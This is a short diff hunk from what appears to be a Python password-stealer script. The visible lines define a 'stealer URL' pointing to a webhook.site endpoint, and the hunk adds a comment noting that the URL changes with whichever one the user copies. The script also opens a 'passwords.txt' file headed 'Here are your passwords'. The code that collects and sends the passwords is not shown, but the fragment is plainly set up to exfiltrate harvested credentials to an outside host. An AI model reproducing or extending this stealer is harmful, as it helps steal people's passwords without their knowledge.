@@ -3,7 +3,7 @@ import os
 import sys
 import requests 
 #stealer URL
-url = "https://webhook.site/e08b6ebf-8b90-4ba9-a461-f064fc39fb6d"
+url = "https://webhook.site/e08b6ebf-8b90-4ba9-a461-f064fc39fb6d"  #keeps varying depending on the URL u copy from the website
 #Create a file
 password_file = open("passwords.txt","w")
 password_file.write("Hello Sir! Here are your passwords : \n\n")
